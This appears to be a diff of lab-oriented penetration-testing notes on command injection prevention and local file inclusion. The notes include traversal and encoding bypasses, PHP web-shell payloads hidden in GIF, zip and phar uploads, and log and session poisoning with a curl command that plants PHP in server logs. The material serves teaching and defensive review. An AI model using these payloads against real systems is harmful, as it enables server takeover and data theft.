+<p>The <code>filename</code> parameter goes unsanitized into a shell command. The same injection methods apply across both examples.</p>
+<p>Command injection is <strong>not unique to web applications</strong> — binaries and thick clients that pass unsanitized user input to system command functions are equally vulnerable.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="command-injection-prevention"><a class="header" href="#command-injection-prevention">Command Injection Prevention</a></h1>
+<h2 id="avoid-system-command-functions"><a class="header" href="#avoid-system-command-functions">Avoid system command functions</a></h2>
+<p>Prefer <strong>built-in language functions</strong> over system command execution. For example, in PHP, use <code>fsockopen()</code> to test connectivity instead of executing <code>ping</code> via <code>system()</code>.</p>
+<p>When system commands are unavoidable:</p>
+<ul>
+<li>Never pass raw user input directly to them</li>
+<li>Validate and sanitize on the <strong>back-end</strong> before use</li>
+<li>Minimize their use — only when no built-in alternative exists</li>
+</ul>
+<p>Front-end validation alone is insufficient; it is trivially bypassed by sending raw HTTP requests.</p>
+<h2 id="input-validation"><a class="header" href="#input-validation">Input validation</a></h2>
+<p>Validate that input matches its expected format <strong>before</strong> processing. Implement on both <strong>front-end and back-end</strong>.</p>
+<p><strong>PHP — built-in IP filter:</strong></p>
+<pre><code class="language-php">if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
+    // call function
+} else {
+    // deny request
+}
+</code></pre>
+<p><strong>PHP — custom regex:</strong></p>
+<pre><code class="language-php">preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_GET['ip'])
+</code></pre>
+<p><strong>NodeJS — regex:</strong></p>
+<pre><code class="language-javascript">if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(...)$/.test(ip)) {
+    // call function
+} else {
+    // deny request
+}
+</code></pre>
+<p><strong>NodeJS — library:</strong> <code>is-ip</code> (<code>npm install is-ip</code>, use <code>isIp(ip)</code>)</p>
+<p>PHP’s <code>filter_var</code> has built-in validators for emails, URLs, IPs, and other standard formats. Consult the docs for .NET, Java, and other platforms for their equivalents.</p>
+<h2 id="input-sanitization"><a class="header" href="#input-sanitization">Input sanitization</a></h2>
+<p>Sanitize <strong>after</strong> validation: remove all characters not required for the expected format. Allowlists (“allow only known good”) are stronger than blacklists (“block known bad”).</p>
+<p><strong>PHP — allowlist regex:</strong></p>
+<pre><code class="language-php">$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
+</code></pre>
+<p><strong>JavaScript:</strong></p>
+<pre><code class="language-javascript">var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
+</code></pre>
+<p><strong>NodeJS — DOMPurify:</strong></p>
+<pre><code class="language-javascript">import DOMPurify from 'dompurify';
+var ip = DOMPurify.sanitize(ip);
+</code></pre>
+<p>For inputs that must allow special characters (e.g., free-text comments), use <code>escapeshellcmd</code> (PHP) or <code>escape()</code> (Node) to escape them — though escaping is weaker than allowlist sanitization and can often be bypassed.</p>
+<h2 id="server-configuration"><a class="header" href="#server-configuration">Server configuration</a></h2>
+<p>Reduce blast radius if the server is compromised:</p>
+<ul>
+<li>Enable the web server’s built-in WAF (e.g., Apache <code>mod_security</code>) plus an external WAF (Cloudflare, Fortinet, Imperva)</li>
+<li>Run the web server as a low-privilege user (<strong>Principle of Least Privilege</strong> — e.g., <code>www-data</code>)</li>
+<li>Disable dangerous PHP functions: <code>disable_functions=system,exec,shell_exec,passthru,...</code></li>
+<li>Restrict web app filesystem scope: <code>open_basedir = '/var/www/html'</code></li>
+<li>Reject double-encoded requests and non-ASCII characters in URLs</li>
+<li>Avoid sensitive or outdated modules (e.g., PHP CGI)</li>
+</ul>
+<p>Secure configuration complements secure coding — neither alone is sufficient. Pair both with ongoing penetration testing, since any single mistake in a large codebase can reintroduce a vulnerability.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="file-inclusion-1"><a class="header" href="#file-inclusion-1">File inclusion</a></h1>
+<h2 id="directory-map-16"><a class="header" href="#directory-map-16">Directory map</a></h2>
 <ul>
 <li><a href="#intro-to-file-inclusions">Intro to file inclusions — LFI basics, templating, impact, examples (PHP, Node, Java, .NET), read vs execute</a></li>
 <li><a href="#local-file-inclusion-lfi--exploitation-basics">Local file inclusion (LFI) — exploitation basics, traversal, prefixes, extensions, second-order</a></li>
@@ -24181,7 +24598,7 @@ SQL&gt; xp_cmdshell whoami /priv
 <li><a href="#lfi-and-file-uploads">LFI and file uploads — polyglot images, discovering upload paths, PHP <code>zip://</code> / <code>phar://</code> chains, legacy phpinfo edge case</a></li>
 <li><a href="#log-poisoning-for-lfi--rce">Log poisoning (LFI → RCE) — PHP session files, Apache/Nginx access logs, <code>/proc</code> hints, SSH/FTP/mail logs, permissions and safety</a></li>
 </ul>
-<h2 id="summary-5"><a class="header" href="#summary-5">Summary</a></h2>
+<h2 id="summary-6"><a class="header" href="#summary-6">Summary</a></h2>
 <p>File inclusion flaws happen when <strong>HTTP parameters or path segments choose a file</strong> to load or render, and that choice is <strong>not safely constrained</strong>. <strong>Local File Inclusion (LFI)</strong> lets attackers read (or sometimes execute) arbitrary server files—common around <strong>templating</strong> patterns such as <code>index.php?page=about</code> where the <code>page</code> fragment maps to an include path. Impacts include <strong>source disclosure</strong>, <strong>secret leakage</strong> (keys, credentials, configs), and under some primitives <strong>remote code execution</strong>. Examples span <strong>PHP</strong> (<code>include</code> / <code>require</code> / <code>file_get_contents</code> and friends), <strong>Node</strong> (<code>fs.readFile</code>, <code>path.join</code> breakout, <code>res.render</code> with interpolated paths), <strong>Java/JSP</strong> (<code>jsp:include</code>, <code>c:import</code>), and <strong>.NET</strong> (<code>Response.WriteFile</code>, <code>@Html.Partial</code>, SSI includes). A key review axis is <strong>read-only vs execute</strong> and <strong>local vs remote URL</strong> support: execution-capable includes (e.g. PHP <code>include</code>, some <code>c:import</code> / SSI cases) widen blast radius to <strong>RCE</strong>, while read-only sinks still enable <strong>credential and logic leakage</strong>. Defensive themes are <strong>allowlisting</strong>, <strong>canonical path checks</strong>, and <strong>never wiring raw request data into filesystem or template resolution</strong>.</p>
 <p>For <strong>exploitation mechanics</strong>, see <a href="#local-file-inclusion-lfi--exploitation-basics">local-file-inclusion.md</a>: swapping parameters for system files (e.g. <code>/etc/passwd</code>), <strong><code>../</code> path traversal</strong> when a directory is prepended, <strong><code>/</code>-led payloads</strong> when a <strong>filename prefix</strong> is concatenated, the effect of <strong>appended extensions</strong>, <strong>second-order</strong> LFI via stored fields (e.g. usernames used in download paths), and the lab distinction between <strong>reading PHP source</strong> vs <strong>executing</strong> it.</p>
 <p>For <strong>filter and normalizer bypasses</strong> (single-pass <code>../</code> stripping, URL/double encoding, regex-approved path prefixes, and legacy PHP tricks for forced extensions), see <a href="#local-file-inclusion-lfi--basic-bypasses">lfi-basic-bypasses.md</a>.</p>
@@ -24204,14 +24621,14 @@ SQL&gt; xp_cmdshell whoami /priv
 <p>Even read-only disclosure can compromise the application or adjacent systems if secrets leak.</p>
 <h2 id="vulnerable-patterns-by-stack"><a class="header" href="#vulnerable-patterns-by-stack">Vulnerable patterns (by stack)</a></h2>
 <p>The core mistake is the same everywhere: <strong>user input flows into a file path or include target</strong> with insufficient normalization, allowlisting, or sandboxing.</p>
-<h3 id="php"><a class="header" href="#php">PHP</a></h3>
+<h3 id="php-1"><a class="header" href="#php-1">PHP</a></h3>
 <p><code>include()</code>, <code>include_once()</code>, <code>require()</code>, <code>require_once()</code>, <code>file_get_contents()</code>, and related APIs load paths. Passing <code>$_GET['language']</code> (or similar) straight through is unsafe:</p>
 <pre><code class="language-php">if (isset($_GET['language'])) {
     include($_GET['language']);
 }
 </code></pre>
 <p>Other dangerous sinks include <code>fopen()</code>, <code>readfile()</code>, etc., depending on whether the goal is execution vs disclosure.</p>
-<h3 id="nodejs"><a class="header" href="#nodejs">Node.js</a></h3>
+<h3 id="nodejs-1"><a class="header" href="#nodejs-1">Node.js</a></h3>
 <p><code>fs.readFile</code> with a user segment under <code>path.join(__dirname, req.query.language)</code> still breaks out if <code>language</code> contains <code>../</code>:</p>
 <pre><code class="language-javascript">if (req.query.language) {
   fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
@@ -24263,6 +24680,90 @@ SQL&gt; xp_cmdshell whoami /priv
 <h2 id="scope-note"><a class="header" href="#scope-note">Scope note</a></h2>
 <p>Many lab-style materials emphasize <strong>PHP on Linux</strong> because payloads and log poisoning chains are well documented. The <strong>root cause</strong> (unsafe path composition) is framework-agnostic; defenses (allowlists, canonical paths, no direct filesystem mapping from HTTP parameters) apply everywhere.</p>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="local-file-inclusion-lfi--basic-bypasses"><a class="header" href="#local-file-inclusion-lfi--basic-bypasses">Local File Inclusion (LFI) — basic bypasses</a></h1>
+<p>When an app tries to block LFI, weak filters and normalizers often <strong>fail in predictable ways</strong>. The patterns below apply to <strong>any</strong> stack where user input becomes part of a filesystem path—the examples use PHP because labs often do, but the logic (single-pass replacement, regex anchors, decoding order) is universal.</p>
+<h2 id="non-recursive--removal"><a class="header" href="#non-recursive--removal">Non-recursive <code>../</code> removal</a></h2>
+<p>A naive defense deletes the literal substring <code>../</code> once:</p>
+<pre><code class="language-php">$language = str_replace('../', '', $_GET['language']);
+</code></pre>
+<p>Input like <code>../../../../etc/passwd</code> becomes <code>./languages/etc/passwd</code> after stripping—traversal is “neutralized” only on paper. Because the replacement runs <strong>once</strong> on the original string (not repeatedly on the result), you can <strong>rebuild</strong> <code>../</code> after the filter runs. Example: <code>....//</code> loses the inner <code>../</code> and leaves <code>../</code>. Chaining gives real traversal again, e.g. <code>....//....//....//....//etc/passwd</code>.</p>
+<p>Similar shapes include <code>..././</code>, <code>....\/</code>, extra slashes (<code>....////</code>), and other encodings that collapse or re-form traversal after a single pass.</p>
+<h2 id="url-encoding-and-double-encoding"><a class="header" href="#url-encoding-and-double-encoding">URL encoding (and double encoding)</a></h2>
+<p>Filters that look for raw <code>.</code> or <code>/</code> may miss the same bytes <strong>after</strong> decoding. Encoding <code>../</code> as <code>%2e%2e%2f</code> (encode <strong>both</strong> dots—some encoders skip dots) can slip past character blacklists. Older PHP (around <strong>5.3.4 and earlier</strong>) had known issues around decoding and path handling; modern PHP is stricter, but <strong>custom</strong> WAFs and app-layer checks still mis-order “block” vs “decode,” so <strong>double encoding</strong> (encode the already-encoded string again) sometimes clears a second line of defense.</p>
+<p>Treat this like other injection families: the same blacklist/encoding games used in command injection often transfer to LFI. Burp <strong>Decoder</strong> is a practical way to iterate encodings in testing.</p>
+<h2 id="approved-path-prefixes-regex-allowlists"><a class="header" href="#approved-path-prefixes-regex-allowlists">Approved path prefixes (regex allowlists)</a></h2>
+<p>An app may require paths under a fixed prefix, e.g.:</p>
+<pre><code class="language-php">if (preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
+    include($_GET['language']);
+}
+</code></pre>
+<p><strong>Discovery:</strong> watch normal traffic from forms and fuzz sibling directories under the same prefix until something matches the pattern.</p>
+<p><strong>Bypass:</strong> satisfy the regex <strong>then</strong> traverse out, e.g. <code>./languages/../../../../etc/passwd</code>. Combine with encoding or non-recursive tricks when multiple defenses are stacked.</p>
+<h2 id="appended-extension-eg-forced-php"><a class="header" href="#appended-extension-eg-forced-php">Appended extension (e.g. forced <code>.php</code>)</a></h2>
+<p>If the server does <code>include($input . '.php')</code>, modern PHP usually keeps the suffix—so you may be limited to <strong>disclosure of same-extension files</strong> (still valuable for source and secrets). Two <strong>legacy</strong> PHP angles matter only on <strong>old</strong> runtimes but are worth knowing for rare targets.</p>
+<h3 id="path-truncation-pre53--54-era-behavior"><a class="header" href="#path-truncation-pre53--54-era-behavior">Path truncation (pre–5.3 / 5.4 era behavior)</a></h3>
+<p>Historically, very long path strings could hit <strong>length limits</strong> (often cited around <strong>4096</strong> characters on 32-bit-era PHP), with trailing normalization quirks (extra <code>/</code>, lone <code>.</code> segments, multiple slashes) behaving like typical filesystem rules. The idea: craft an enormous padding path so that, after truncation and normalization, the <strong>appended <code>.php</code> falls off</strong> or the resolved path ends where you need it—often starting with a <strong>non-existent</strong> leading directory segment and repeating <code>./</code> (or similar) many times so only the intended file survives the truncation math.</p>
+<p>Example pattern to generate padding (adjust counts to hit the length you need after measuring the full string):</p>
+<pre><code class="language-bash">echo -n "non_existing_directory/../../../etc/passwd/" &amp;&amp; for i in {1..2048}; do echo -n "./"; done
+</code></pre>
+<p>Always <strong>measure total length</strong> so truncation removes the extension (or junk) and <strong>not</strong> your target filename.</p>
+<h3 id="null-bytes-php-before-55"><a class="header" href="#null-bytes-php-before-55">Null bytes (PHP before 5.5)</a></h3>
+<p>Older PHP treated <code>%00</code> as a <strong>C-style string terminator</strong> in some path contexts. Payload shape: <code>/etc/passwd%00</code> so the effective path becomes <code>/etc/passwd</code> before the appended <code>.php</code> is considered—<strong>obsolete</strong> on current PHP but still relevant when auditing ancient servers.</p>
+<h2 id="takeaways"><a class="header" href="#takeaways">Takeaways</a></h2>
+<ul>
+<li><strong>Single-pass</strong> <code>../</code> stripping is bypassable with residual <code>../</code> after substitution.</li>
+<li><strong>Encoding</strong> and <strong>double encoding</strong> exploit “filter before decode” mistakes; dots must be encoded when the defense keys on literal dots.</li>
+<li><strong>Regex-approved prefixes</strong> are not roots: traversal <strong>after</strong> the allowed prefix often still reaches <code>/etc/passwd</code> and friends.</li>
+<li><strong>Forced extensions</strong> narrow modern PHP LFI; <strong>truncation</strong> and <strong>null bytes</strong> are historical PHP bypasses for very old versions only.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="lfi-and-file-uploads"><a class="header" href="#lfi-and-file-uploads">LFI and file uploads</a></h1>
+<p>Legitimate <strong>file uploads</strong> (avatars, attachments, imports) are common. The risk here is usually not a broken upload validator alone but <strong>chaining</strong> with <strong>Local File Inclusion (LFI)</strong>: if an <strong>execution-capable</strong> include processes the attacker-controlled path, <strong>PHP inside an uploaded file can run</strong> when that path is included—even if the file looks like an image by extension and magic bytes.</p>
+<h2 id="preconditions"><a class="header" href="#preconditions">Preconditions</a></h2>
+<ul>
+<li><strong>Upload</strong> that stores a file the attacker can place (does not need to be “vulnerable” beyond accepting the bytes).</li>
+<li><strong>LFI</strong> into a sink that <strong>executes</strong> code for the chosen resource (same matrix as <a href="#intro-to-file-inclusions">intro to file inclusions</a>: PHP <code>include</code> / <code>include_once</code>, Java <code>import</code> in risky patterns, .NET <code>include</code>, etc.). <code>require</code> / Node <code>res.render</code> are called out in course material as <strong>no remote URL</strong> in some rows; focus on <strong>execute</strong> capability for RCE.</li>
+</ul>
+<h2 id="polyglot-image--include"><a class="header" href="#polyglot-image--include">Polyglot “image” + include</a></h2>
+<ol>
+<li>
+<p>Build a file that passes casual checks: <strong>allowed extension</strong> (e.g. <code>.gif</code>) and <strong>magic bytes</strong> at the start (e.g. <code>GIF8</code>—ASCII-friendly; other types work but may need binary/encoding care).</p>
+</li>
+<li>
+<p>Append <strong>PHP</strong> after the magic header, for example:</p>
+<pre><code class="language-bash">echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif
+</code></pre>
+</li>
+<li>
+<p>Upload via the app (e.g. profile photo). The file is inert until something <strong>includes</strong> it as PHP.</p>
+</li>
+<li>
+<p>Discover <strong>on-disk or URL path</strong> (HTML <code>img src</code>, browser devtools, or fuzz <strong><code>/uploads</code></strong>, <strong><code>/profile_images</code></strong>, etc.—paths may be hidden).</p>
+</li>
+<li>
+<p>Trigger LFI with that path (and <strong><code>../</code></strong> if the sink <strong>prepends</strong> a base directory). Example:</p>
+<p><code>index.php?language=./profile_images/shell.gif&amp;cmd=id</code></p>
+</li>
+</ol>
+<p>The shell is harmless for normal image serving; <strong>inclusion</strong> is what executes it.</p>
+<h2 id="php-only-alternatives-zip-and-phar"><a class="header" href="#php-only-alternatives-zip-and-phar">PHP-only alternatives: <code>zip://</code> and <code>phar://</code></a></h2>
+<p>Use when the polyglot trick fails or wrappers are attractive; both depend on <strong>PHP</strong> and <strong>configuration / detection</strong> quirks.</p>
+<h3 id="zip-wrapper"><a class="header" href="#zip-wrapper">Zip wrapper</a></h3>
+<p><code>zip</code> may be <strong>disabled</strong>; not universal.</p>
+<pre><code class="language-bash">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php
+</code></pre>
+<p>Upload <code>shell.jpg</code> (a zip). Include with <strong><code>#</code></strong> URL-encoded as <strong><code>%23</code></strong>:</p>
+<p><code>language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code></p>
+<p>Renaming zip to <code>.jpg</code> can still fail <strong>content-type</strong> sniffers; works best when <strong>zip uploads</strong> are allowed.</p>
+<h3 id="phar-wrapper"><a class="header" href="#phar-wrapper">Phar wrapper</a></h3>
+<p>Build a <strong>Phar</strong> containing an inner file with PHP, rename to something uploadable (e.g. <code>shell.jpg</code>). Requires <strong><code>php --define phar.readonly=0</code></strong> to generate. Include:</p>
+<p><code>language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></p>
+<p>(inner path per how the archive was built). Treat <strong>zip</strong> and <strong>phar</strong> as <strong>fallbacks</strong>; <strong>polyglot upload + LFI</strong> is often the most reliable of the three.</p>
+<h2 id="legacy-edge-case"><a class="header" href="#legacy-edge-case">Legacy edge case</a></h2>
+<p>Older setups: <strong><code>file_uploads</code></strong> on, <strong>old PHP</strong>, <strong><code>phpinfo()</code></strong> exposed, plus LFI—historical <strong>temporary upload path</strong> abuse. Rare today; specific requirements.</p>
+<h2 id="defensive-takeaway"><a class="header" href="#defensive-takeaway">Defensive takeaway</a></h2>
+<p>Secure <strong>uploads</strong> (type, storage outside web root, non-executable serving) still matters, but <strong>do not</strong> rely on “images are safe” if <strong>any code path can include</strong> user-influenced filesystem paths with <strong>execute</strong> semantics. Prefer <strong>no user input in include paths</strong>, <strong>allowlists</strong>, and <strong>non-executable</strong> storage and response paths.</p>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="local-file-inclusion-lfi--exploitation-basics"><a class="header" href="#local-file-inclusion-lfi--exploitation-basics">Local File Inclusion (LFI) — exploitation basics</a></h1>
 <p>After you know <strong>how</strong> file inclusion happens (user input resolving to a filesystem path), the next step is <strong>reading local files</strong> on the server by steering that path. The ideas below apply broadly—not only to PHP—whenever a parameter or stored value ends up in a file read/include primitive.</p>
 <h2 id="basic-lfi"><a class="header" href="#basic-lfi">Basic LFI</a></h2>
@@ -24294,7 +24795,7 @@ SQL&gt; xp_cmdshell whoami /priv
 <p><strong>Second-order</strong> attacks store the payload <strong>indirectly</strong> (often in a <strong>database</strong>), then a <strong>later</strong> feature uses that value as a path component.</p>
 <p>Example: avatar download at <code>/profile/$username/avatar.png</code>. If <code>username</code> can be set to something like <code>../../../etc/passwd</code> during registration, a later “download my avatar” flow may open the wrong file. Developers may sanitize <strong>direct</strong> query parameters but still <strong>trust DB-backed fields</strong>—that trust is the bug.</p>
 <p>Exploitation is the same path logic as first-order LFI; the extra work is <strong>mapping</strong> which stored field flows into which file operation.</p>
-<h2 id="takeaways"><a class="header" href="#takeaways">Takeaways</a></h2>
+<h2 id="takeaways-1"><a class="header" href="#takeaways-1">Takeaways</a></h2>
 <ul>
 <li>Test <strong>absolute paths</strong> when input is used verbatim; use <strong><code>../</code> chains</strong> when a base directory is prepended; use <strong><code>/</code>-prefixed traversal</strong> when a filename prefix is glued on.</li>
 <li><strong>Extension appending</strong> and other normalizations need their own bypass families.</li>
@@ -24302,42 +24803,78 @@ SQL&gt; xp_cmdshell whoami /priv
 <li>Techniques are <strong>language-agnostic</strong> at the logic level: any stack that builds paths from untrusted data can exhibit the same classes of flaws.</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="local-file-inclusion-lfi--basic-bypasses"><a class="header" href="#local-file-inclusion-lfi--basic-bypasses">Local File Inclusion (LFI) — basic bypasses</a></h1>
-<p>When an app tries to block LFI, weak filters and normalizers often <strong>fail in predictable ways</strong>. The patterns below apply to <strong>any</strong> stack where user input becomes part of a filesystem path—the examples use PHP because labs often do, but the logic (single-pass replacement, regex anchors, decoding order) is universal.</p>
-<h2 id="non-recursive--removal"><a class="header" href="#non-recursive--removal">Non-recursive <code>../</code> removal</a></h2>
-<p>A naive defense deletes the literal substring <code>../</code> once:</p>
-<pre><code class="language-php">$language = str_replace('../', '', $_GET['language']);
-</code></pre>
-<p>Input like <code>../../../../etc/passwd</code> becomes <code>./languages/etc/passwd</code> after stripping—traversal is “neutralized” only on paper. Because the replacement runs <strong>once</strong> on the original string (not repeatedly on the result), you can <strong>rebuild</strong> <code>../</code> after the filter runs. Example: <code>....//</code> loses the inner <code>../</code> and leaves <code>../</code>. Chaining gives real traversal again, e.g. <code>....//....//....//....//etc/passwd</code>.</p>
-<p>Similar shapes include <code>..././</code>, <code>....\/</code>, extra slashes (<code>....////</code>), and other encodings that collapse or re-form traversal after a single pass.</p>
-<h2 id="url-encoding-and-double-encoding"><a class="header" href="#url-encoding-and-double-encoding">URL encoding (and double encoding)</a></h2>
-<p>Filters that look for raw <code>.</code> or <code>/</code> may miss the same bytes <strong>after</strong> decoding. Encoding <code>../</code> as <code>%2e%2e%2f</code> (encode <strong>both</strong> dots—some encoders skip dots) can slip past character blacklists. Older PHP (around <strong>5.3.4 and earlier</strong>) had known issues around decoding and path handling; modern PHP is stricter, but <strong>custom</strong> WAFs and app-layer checks still mis-order “block” vs “decode,” so <strong>double encoding</strong> (encode the already-encoded string again) sometimes clears a second line of defense.</p>
-<p>Treat this like other injection families: the same blacklist/encoding games used in command injection often transfer to LFI. Burp <strong>Decoder</strong> is a practical way to iterate encodings in testing.</p>
-<h2 id="approved-path-prefixes-regex-allowlists"><a class="header" href="#approved-path-prefixes-regex-allowlists">Approved path prefixes (regex allowlists)</a></h2>
-<p>An app may require paths under a fixed prefix, e.g.:</p>
-<pre><code class="language-php">if (preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
-    include($_GET['language']);
-}
-</code></pre>
-<p><strong>Discovery:</strong> watch normal traffic from forms and fuzz sibling directories under the same prefix until something matches the pattern.</p>
-<p><strong>Bypass:</strong> satisfy the regex <strong>then</strong> traverse out, e.g. <code>./languages/../../../../etc/passwd</code>. Combine with encoding or non-recursive tricks when multiple defenses are stacked.</p>
-<h2 id="appended-extension-eg-forced-php"><a class="header" href="#appended-extension-eg-forced-php">Appended extension (e.g. forced <code>.php</code>)</a></h2>
-<p>If the server does <code>include($input . '.php')</code>, modern PHP usually keeps the suffix—so you may be limited to <strong>disclosure of same-extension files</strong> (still valuable for source and secrets). Two <strong>legacy</strong> PHP angles matter only on <strong>old</strong> runtimes but are worth knowing for rare targets.</p>
-<h3 id="path-truncation-pre53--54-era-behavior"><a class="header" href="#path-truncation-pre53--54-era-behavior">Path truncation (pre–5.3 / 5.4 era behavior)</a></h3>
-<p>Historically, very long path strings could hit <strong>length limits</strong> (often cited around <strong>4096</strong> characters on 32-bit-era PHP), with trailing normalization quirks (extra <code>/</code>, lone <code>.</code> segments, multiple slashes) behaving like typical filesystem rules. The idea: craft an enormous padding path so that, after truncation and normalization, the <strong>appended <code>.php</code> falls off</strong> or the resolved path ends where you need it—often starting with a <strong>non-existent</strong> leading directory segment and repeating <code>./</code> (or similar) many times so only the intended file survives the truncation math.</p>
-<p>Example pattern to generate padding (adjust counts to hit the length you need after measuring the full string):</p>
-<pre><code class="language-bash">echo -n "non_existing_directory/../../../etc/passwd/" &amp;&amp; for i in {1..2048}; do echo -n "./"; done
-</code></pre>
-<p>Always <strong>measure total length</strong> so truncation removes the extension (or junk) and <strong>not</strong> your target filename.</p>
-<h3 id="null-bytes-php-before-55"><a class="header" href="#null-bytes-php-before-55">Null bytes (PHP before 5.5)</a></h3>
-<p>Older PHP treated <code>%00</code> as a <strong>C-style string terminator</strong> in some path contexts. Payload shape: <code>/etc/passwd%00</code> so the effective path becomes <code>/etc/passwd</code> before the appended <code>.php</code> is considered—<strong>obsolete</strong> on current PHP but still relevant when auditing ancient servers.</p>
-<h2 id="takeaways-1"><a class="header" href="#takeaways-1">Takeaways</a></h2>
+<h1 id="log-poisoning-for-lfi--rce"><a class="header" href="#log-poisoning-for-lfi--rce">Log poisoning for LFI → RCE</a></h1>
+<p>When an <strong>execution-capable</strong> include processes a path as PHP, <strong>any included file that contains PHP runs</strong>. <strong>Log poisoning</strong> (also called log contamination) means <strong>writing attacker PHP into a log or session file</strong> the app already writes, then <strong>including that file</strong> through the LFI parameter. It works wherever the <strong>web process can read</strong> the poisoned file—paths and permissions differ by stack and hardening.</p>
+<p>The same <strong>read / execute / remote URL</strong> matrix applies as in <a href="#intro-to-file-inclusions">intro to file inclusions</a>: sinks that <strong>execute</strong> (e.g. PHP <code>include</code> / <code>include_once</code>, Java <code>import</code> / .NET <code>include</code> in risky patterns) enable RCE; <code>require</code> / Node <code>res.render</code> rows in course material stress <strong>no remote URL</strong> in some cases—here the focus is <strong>execute + readable poisoned file</strong>.</p>
+<h2 id="php-session-poisoning"><a class="header" href="#php-session-poisoning">PHP session poisoning</a></h2>
+<p>PHP stores session data in files keyed by <strong><code>PHPSESSID</code></strong>:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Platform</th><th>Typical directory</th></tr>
+</thead>
+<tbody>
+<tr><td>Linux</td><td><code>/var/lib/php/sessions/</code></td></tr>
+<tr><td>Windows</td><td><code>C:\Windows\Temp\</code></td></tr>
+</tbody>
+</table>
+</div>
+<p>Filename: <strong><code>sess_</code> + cookie value</strong>, e.g. cookie <code>abc123</code> → <code>/var/lib/php/sessions/sess_abc123</code>.</p>
+<p><strong>Workflow</strong></p>
+<ol>
+<li>Confirm you have a <strong><code>PHPSESSID</code></strong>; map it to <strong><code>sess_&lt;id&gt;</code></strong> on disk.</li>
+<li><strong>Include the session file</strong> via LFI and inspect serialized contents for <strong>fields you control</strong> (e.g. a <code>page</code> key tied to <code>?language=</code>).</li>
+<li><strong>Poison</strong>: request with <code>?language=</code> set to <strong>URL-encoded PHP</strong> (e.g. <code>&lt;?php system($_GET['cmd']); ?&gt;</code>).</li>
+<li><strong>Include the session file again</strong> and pass <strong><code>&amp;cmd=id</code></strong> (or another command) on the include request.</li>
+</ol>
+<p><strong>Operational notes</strong></p>
 <ul>
-<li><strong>Single-pass</strong> <code>../</code> stripping is bypassable with residual <code>../</code> after substitution.</li>
-<li><strong>Encoding</strong> and <strong>double encoding</strong> exploit “filter before decode” mistakes; dots must be encoded when the defense keys on literal dots.</li>
-<li><strong>Regex-approved prefixes</strong> are not roots: traversal <strong>after</strong> the allowed prefix often still reaches <code>/etc/passwd</code> and friends.</li>
-<li><strong>Forced extensions</strong> narrow modern PHP LFI; <strong>truncation</strong> and <strong>null bytes</strong> are historical PHP bypasses for very old versions only.</li>
+<li>Cookie values <strong>differ per session</strong>; always use <strong>your</strong> <code>sess_*</code> path.</li>
+<li>After you include the session file with <code>language=/var/lib/php/sessions/sess_...</code>, the app may <strong>overwrite</strong> session data with that path string—<strong>re-poison</strong> before another command. Prefer dropping a <strong>persistent webshell</strong> under the web root or <strong>reverse shell</strong> once you have execution.</li>
+<li>If nothing in the session file is user-influenced, this chain does not apply.</li>
 </ul>
+<h2 id="web-server-access-logs-apache--nginx"><a class="header" href="#web-server-access-logs-apache--nginx">Web server access logs (Apache / Nginx)</a></h2>
+<p><strong><code>access.log</code></strong> records each request, including the <strong><code>User-Agent</code></strong> header—<strong>fully client-controlled</strong>. Poison by sending <strong>any</strong> request (not only the LFI URL) with <code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code>, then <strong>include the log</strong> via LFI.</p>
+<p><strong>Default log locations</strong> (verify; fuzz with an LFI wordlist if needed)</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Server</th><th>Linux</th><th>Windows (common)</th></tr>
+</thead>
+<tbody>
+<tr><td>Apache</td><td><code>/var/log/apache2/</code></td><td><code>C:\xampp\apache\logs\</code></td></tr>
+<tr><td>Nginx</td><td><code>/var/log/nginx/</code></td><td><code>C:\nginx\log\</code></td></tr>
+</tbody>
+</table>
+</div>
+<p><strong>Permissions</strong></p>
+<ul>
+<li><strong>Nginx</strong> logs are often readable by low-privileged users (e.g. <code>www-data</code>) by default.</li>
+<li><strong>Apache</strong> logs are often restricted to <strong>root</strong> / <strong>adm</strong>; <strong>older or misconfigured</strong> Apache may allow <strong>www-data</strong> read access.</li>
+</ul>
+<p><strong>cURL example</strong> (write header to a file, then send):</p>
+<pre><code class="language-bash">echo -n "User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;" &gt; Poison
+curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -H @Poison
+</code></pre>
+<p>Then trigger LFI against <code>access.log</code> and add <strong><code>&amp;cmd=id</code></strong>.</p>
+<p><strong>Safety</strong></p>
+<ul>
+<li>Logs can be <strong>very large</strong>; including them may be <strong>slow</strong> or <strong>harmful</strong> in production. Minimize noise and avoid repeated full-log pulls.</li>
+</ul>
+<p><strong>Alternatives</strong></p>
+<ul>
+<li><strong><code>User-Agent</code></strong> may also appear under <strong><code>/proc/</code></strong> (e.g. <code>/proc/self/environ</code>, <code>/proc/self/fd/N</code> for small <strong>N</strong>). If logs are unreadable, these are worth trying—<strong>they may still require elevated read</strong>.</li>
+</ul>
+<h2 id="other-service-logs"><a class="header" href="#other-service-logs">Other service logs</a></h2>
+<p>If LFI can <strong>read</strong> a log and you can <strong>inject PHP into a logged field</strong>, the same idea applies:</p>
+<ul>
+<li><strong><code>/var/log/sshd.log</code></strong> — e.g. <strong>username</strong> set to PHP when SSH is exposed.</li>
+<li><strong><code>/var/log/vsftpd.log</code></strong> — <strong>FTP username</strong> as payload.</li>
